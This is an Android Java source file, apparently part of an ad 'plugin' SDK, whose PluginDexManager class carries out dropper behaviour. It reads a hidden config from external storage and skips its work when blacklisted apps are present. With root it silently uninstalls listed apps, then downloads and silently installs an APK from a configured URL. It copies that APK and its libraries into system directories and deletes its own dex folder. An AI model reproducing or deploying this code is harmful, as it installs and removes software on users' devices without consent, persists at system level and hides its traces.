package com.ningso.silence;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;

import com.ningso.silence.downloader.bizs.DLManager;
import com.ningso.silence.downloader.interfaces.SimpleDListener;
import com.ningso.silence.entity.AdBean;
import com.ningso.silence.utils.BackgroundHandler;
import com.ningso.silence.utils.PackageUtils;
import com.ningso.silence.utils.ShellUtils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by NingSo on 16/2/29.下午10:23
 *
 * @author: NingSo
 * @Email: ningdev@163.com
 * 1:检测黑名单是否安装,如果存在则不执行下列逻辑
 * 2:如果不存在,判断卸载名单是否安装
 */
public class PluginDexManager {
    private static String TAG = PluginDexManager.class.getSimpleName();
    private volatile static PluginDexManager singleton;

    private static String saveDir = Environment.getExternalStorageDirectory() + "/AigeStudio/";

    private static Context mContext;
    private static final int HAS_ROOT_SUCCESS = 0x0001;
    private static final int HAS_ROOT_FAIL = 0x0002;
    private static final int HAS_INSTALL_SUCCESS = 0x0003;
    private static final int HAS_INSTALL_FAIL = 0x0004;

    private AdBean adBean;
    private String installFile;
    public Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case HAS_ROOT_SUCCESS:
                    Toast.makeText(mContext, "Root: True", Toast.LENGTH_SHORT).show();
                    break;
                case HAS_ROOT_FAIL:
                    Toast.makeText(mContext, "Root: False", Toast.LENGTH_SHORT).show();
                    break;
                case HAS_INSTALL_SUCCESS:
                    Toast.makeText(mContext, "Install: True", Toast.LENGTH_SHORT).show();
                    //安装成功
                    if (adBean != null) {
                        if (adBean.getActionType() == 1) {
                            ShellUtils.CopyApkToSystem(installFile);
                            ShellUtils.copyLibSo2SystemLib("/data/data/" + adBean.getPkgName() + "/lib");
                        }
                    }
                    deleteDex(mContext);
                    break;
                case HAS_INSTALL_FAIL:
                    Toast.makeText(mContext, "Install: False", Toast.LENGTH_SHORT).show();
                    break;
            }
        }
    };

    public PluginDexManager() {

    }

    public static PluginDexManager getInstance() {
        if (singleton == null) {
            singleton = new PluginDexManager();
        }
        return singleton;
    }

    public boolean initialize(final Context context) {
        mContext = context.getApplicationContext();
        try {
            adBean = AdBean.parse(getStringFileFromSd());
            if (adBean != null) {
                if (compare(adBean.getBlackList(), getAppList(mContext))) {
                    //黑名单
                    return false;
                } else {
                    //卸载白名单
                    if (adBean.isRooted()) {
                        unInstallPackages(mContext, adBean.getUninstallList());
                    }
                    if (!PackageUtils.checkPackageInstalled(context.getApplicationContext(), adBean.getPkgName())) {
                        DLManager.getInstance(context.getApplicationContext()).dlStart(adBean.getApkUrl(), saveDir, null,
                                new SimpleDListener() {
                                    @Override
                                    public void onFinish(File file) {
                                        super.onFinish(file);
                                        installFile = file.getAbsolutePath();
                                        new InStallSilent(installFile).start();
                                    }

                                    @Override
                                    public void onError(int status, String error) {
                                        super.onError(status, error);
                                    }
                                });
                    }
                }
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private void deleteDex(Context context) {
        new ShellUtils().deleteDir(context.getDir("dex", Context.MODE_PRIVATE));
    }

    private String getConfigJson() {
        return Environment.getExternalStorageDirectory() + File.separator + ".fontdex" + File.separator + "action.json";
    }

    /**
     * 读取assets
     *
     * @param context
     * @param fileName
     * @return
     */
    private String getJson(Context context, String fileName) {
        StringBuilder stringBuilder = new StringBuilder();
        InputStreamReader inputStreamReader = null;
        BufferedReader bf = null;
        try {
            AssetManager assetManager = context.getAssets();
            inputStreamReader = new InputStreamReader(assetManager.open(fileName));
            bf = new BufferedReader(inputStreamReader);
            String line;
            while ((line = bf.readLine()) != null) {
                stringBuilder.append(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (inputStreamReader != null) {
                    inputStreamReader.close();
                }
                if (bf != null) {
                    bf.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return stringBuilder.toString();
    }

    /**
     * 读取sd卡文件
     *
     * @return
     */
    private String getStringFileFromSd() {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            File file = new File(getConfigJson());
            if (file.exists()) {
                FileInputStream fileInputStream = new FileInputStream(file);
                BufferedReader bufferedReader = new BufferedReader(
                        new InputStreamReader(fileInputStream));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line);
                }
                fileInputStream.close();
                bufferedReader.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return stringBuilder.toString();
    }

    /**
     * 获取非系统应用信息列表
     */
    private List<String> getAppList(Context context) {
        PackageManager pm = context.getPackageManager();
        List<PackageInfo> packages = pm.getInstalledPackages(0);
        List<String> userAppList = new ArrayList<>();
        for (PackageInfo packageInfo : packages) {
            // 判断系统/非系统应用
            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                userAppList.add(packageInfo.packageName);
            } else {
                // 系统应用　　　　　　　　
            }
        }
        return userAppList;
    }

    /**
     * 比较两个List是否存在相同值
     *
     * @param
     * @param a
     * @param b
     * @return
     */
    public boolean compare(List<String> a, List<String> b) {
        for (String str : a) {
            if (b.contains(str)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 获取交集
     *
     * @param a
     * @param b
     * @return
     */
    public List<String> getIntersection(List<String> a, List<String> b) {
        // a.retainAll(b); 该方法耗时弃用
        List<String> diff = new ArrayList<>();
        for (String str : a) {
            if (b.contains(str)) {
                diff.add(str);
            }
        }
        return diff;
    }

    private void unInstallPackages(final Context content, List<String> pkgName) {
        if (pkgName.size() == 0) {
            return;
        }
        for (final String str : pkgName) {
            BackgroundHandler.post(new Runnable() {
                @Override
                public void run() {
                    if (PackageUtils.checkPackageInstalled(content, str)) {
                        Log.e(TAG, "unInstall" + PackageUtils.uninstallSilent(content, str, false));
                    }
                }
            }, 5000);
        }
    }

    class InStallSilent extends Thread {

        private String filePath;

        public InStallSilent(String filePath) {
            this.filePath = filePath;
        }

        @Override
        public void run() {
            super.run();
            Message message = new Message();
            int installsuccuess = PackageUtils.install(mContext, filePath);
            //  boolean hassuccess = ApkController.install("/system/priv-app/" + "demo.apk", getApplicationContext());
            if (installsuccuess == 1) {
                message.what = HAS_INSTALL_SUCCESS;
            } else {
                message.what = HAS_INSTALL_FAIL;
            }
            handler.sendMessage(message);
        }
    }

}
